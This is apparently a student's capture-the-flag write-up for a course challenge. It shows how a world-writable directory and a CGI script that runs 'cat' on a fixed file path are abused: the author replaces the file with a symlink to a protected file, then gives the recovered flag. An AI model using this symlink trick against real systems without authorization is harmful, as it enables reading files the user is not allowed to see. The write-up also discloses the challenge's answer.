#Title : CS615-level2
#The Matrix

We open the url `https://www.cs.stevens.edu/~jschauma/cgi-bin/ctf.cgi` using browser and find nothing.
so we enter `/home/jschauma/cs_html/cgi-bin` and `cat ctf.cgi`
we found the script
```
$file = "/home/jschauma/cs_html/tmp/d/nope";
```
and

```
#system("cat /home/jschauma/tmp/level-3");
system("cat $file");
```

so the file `/home/jschauma/tmp/level-3` is the answer,but we can't read the file `/home/jschauma/tmp/level-3`
However the folder `/home/jschauma/cs_html/tmp/d/` permission is 777,so we can change the `nope`

First,`mv` the nope to another name and than creat a link to the `/home/jschauma/tmp/level-3`
command is :
```
ln -s  /home/jschauma/tmp/level-3 nope
```

Then open the `https://www.cs.stevens.edu/~jschauma/cgi-bin/ctf.cgi` again and the the answer is 

"Goats, Sheep, Octopus And Toads Have Rectangular Pupils"
